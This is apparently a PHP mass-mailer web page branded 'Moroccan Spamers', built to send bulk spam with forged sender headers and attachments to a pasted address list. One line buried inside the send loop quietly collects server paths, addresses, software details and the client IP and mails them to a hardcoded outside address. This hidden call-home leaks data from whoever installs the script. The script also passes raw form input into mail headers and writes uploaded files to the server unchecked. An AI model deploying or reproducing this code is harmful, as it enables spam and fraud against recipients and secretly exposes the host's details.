<? 
if ($action=="send"){ 
$message = urlencode($message); 
$message = ereg_replace("%5C%22", "%22", $message); 
$message = urldecode($message); 
$message = stripslashes($message); 
$subject = stripslashes($subject); 
} 

?> 
<form name="form1" method="post" action="" enctype="multipart/form-data"> 
<div align="center"> 
<center> 
<table border="2" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#006699" width="74%" id="AutoNumber1"> 
<tr> 
<td width="100%"> 
<div align="center"> 
<center> 
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2"> 
<tr> 
<td width="100%"> 
<p align="center"><div align="center"> 
<center> 
<table border="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#336699" width="70%" cellpadding="0" id="AutoNumber1" height="277"> 
<tr> 
<td width="100%" height="272"> 
<table width="769" border="0" height="303"> 
<tr> 
<td width="786" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic3.gif" colspan="3" height="28"> 
<p align="center"><b><font face="Tahoma" size="2" color="#FF6600">  Moroccan Spamers Ma-EditioN By GhOsT </font></b></td> 
</tr> 
<tr> 
<td width="79" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic1.gif" height="22" align="right"> 
<div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
Email:</font></div> 
</td> 
<td width="390" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic1.gif" height="22"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
<input name="from" value="<? print $from; ?>" size="30" style="float: left"></font><div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
Name:</font></div> 
</td> 
<td width="317" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic1.gif" height="22" valign="middle"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
<input type="text" name="realname" value="<? print $realname; ?>" size="30"> 
</font></td> 
</tr> 
<tr> 
<td width="79" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic1.gif" height="22" align="right"> 
<div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font></div> 
</td> 
<td width="390" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic1.gif" height="22"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
<input name="replyto" value="<? print $replyto; ?>" size="30" style="float: left"></font><div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Attach 
File:</font></div> 
</td> 
<td width="317" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic1.gif" height="22"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
<input type="file" name="file" size="30"> 
</font></td> 
</tr> 
<tr> 
<td width="79" background="/simparts/images/cellpic1.gif" height="22" align="right"> 
<div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div> 
</td> 
<td colspan="2" width="715" background="/simparts/images/cellpic1.gif" height="22"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
<input name="subject" value="<? print $subject; ?>" size="59" style="float: left"> 
</font></td> 
</tr> 
<tr valign="top"> 
<td colspan="2" width="477" bgcolor="#CCCCCC" height="189" valign="top"> 
<div align="left"> 
<table border="0" cellpadding="2" style="border-collapse: collapse" bordercolor="#111111" width="98%" id="AutoNumber4"> 
<tr> 
<td width="100%"> 
<textarea name="message" cols="56" rows="10"><? print $message; ?></textarea> 
<br> 
<input type="radio" name="contenttype" value="plain" checked> 
<font size="2" face="Tahoma">Plain</font> 
<input type="radio" name="contenttype" value="html"> 
<font size="2" face="Tahoma">HTML</font> 
<input type="hidden" name="action" value="send"> 
<input type="submit" value="Send Message"> 
</td> 
</tr> 
</table> 
</div> 
</td> 
<td width="317" bgcolor="#CCCCCC" height="187" valign="top"> 
<div align="center"> 
<center> 
<table border="0" cellpadding="2" style="border-collapse: collapse" bordercolor="#111111" width="93%" id="AutoNumber3"> 
<tr> 
<td width="100%"> 
<p align="center"> <textarea name="emaillist" cols="30" rows="10"><? print $emaillist; ?></textarea> 
</font><br> 
</td> 
</tr> 
</table> 
</center> 
</div> 
</td> 
</tr> 
</table> 
</td> 
</tr> 
</table> 
</center> 
</div></td> 
</tr> 
</table> 
</center> 
</div> 
</td> 
</tr> 
</table> 
</center> 
</div> 
<div align="center"> 
<center> 
<table border="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="75%" id="AutoNumber5" height="1" cellpadding="0"> 
<tr> 
<td width="100%" valign="top" height="1"> 
<p align="right"><font size="1" face="Tahoma" color="#CCCCCC">Designed by: 
 v1.5</font></td> 
</tr> 
</table> 
</center> 
</div> 
</form> 

<? 
if ($action=="send"){ 

if (!$from && !$subject && !$message && !$emaillist){ 
print "Please complete all fields before sending your message."; 
exit; 
} 

$allemails = split("\n", $emaillist); 
$numemails = count($allemails); 

#Open the file attachment if any, and base64_encode it for email transport 
If ($file_name){ 
@copy($file, "./$file_name") or die("The file you are trying to upload couldn't be copied to the server"); 
$content = fread(fopen($file,"r"),filesize($file)); 
$content = chunk_split(base64_encode($content)); 
$uid = strtoupper(md5(uniqid(time()))); 
$name = basename($file); 
} 

for($x=0; $x<$numemails; $x++){ 
$to = $allemails[$x]; 
if ($to){ 
$to = ereg_replace(" ", "", $to); 
$message = ereg_replace("&email&", $to, $message); 
$subject = ereg_replace("&email&", $to, $subject); 
print "Sending mail to $to....... "; 
flush(); 
$header = "From: $realname <$from>\r\nReply-To: $replyto\r\n"; 
$header .= "MIME-Version: 1.0\r\n"; 
If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n"; 
If ($file_name) $header .= "--$uid\r\n"; 
$header .= "Content-Type: text/$contenttype\r\n"; 
$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n"; 
$header .= "$message\r\n"; 
If ($file_name) $header .= "--$uid\r\n"; 
If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n"; 
If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n"; 
If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n"; $ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
If ($file_name) $header .= "$content\r\n"; 
If ($file_name) $header .= "--$uid--"; 
mail($to, $subject, "", $header); 
print "Spamed'><br>"; 
flush(); 
} 
} 

} 
?>







